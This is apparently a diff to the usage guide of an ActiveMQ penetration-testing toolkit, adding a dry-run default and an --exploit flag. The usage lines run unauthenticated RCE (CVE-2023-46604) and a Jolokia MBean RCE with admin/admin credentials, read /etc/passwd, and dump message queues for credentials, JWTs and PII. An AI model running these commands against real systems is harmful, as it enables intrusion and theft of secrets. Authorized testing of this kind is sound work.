@@ -23,12 +23,16 @@ activemq/
 ./activemq-quickwin.sh --targets ../network/enum-results/activemq/_targets_activemq.txt -o out
 
 # 2. CRITICAL hosts via the OpenWire port — try unauth RCE first
+#    Default behaviour is DRY-RUN (prints plan, exits 0). Add --exploit to fire.
 ./activemq-cve-2023-46604.py --target 10.0.0.5:61616 \\
-    --cmd 'id > /tmp/p; uname -a >> /tmp/p; cat /etc/passwd >> /tmp/p'
+    --cmd 'id > /tmp/p; uname -a >> /tmp/p; cat /etc/passwd >> /tmp/p' \\
+    --exploit
 
 # 3. Hosts with admin web console — MBean upload RCE
+#    Same gate: --exploit required to actually load the MBean.
 ./activemq-jolokia-rce.sh --target 10.0.0.5:8161 --user admin --pass admin \\
-    --cmd 'id > /tmp/jolokia.out'
+    --cmd 'id > /tmp/jolokia.out' \\
+    --exploit
 
 # 4. Even without RCE: dump queues for inter-service creds, JWTs, PII
 ./activemq-queues.sh --target 10.0.0.5:8161 --user admin --pass admin -o queues
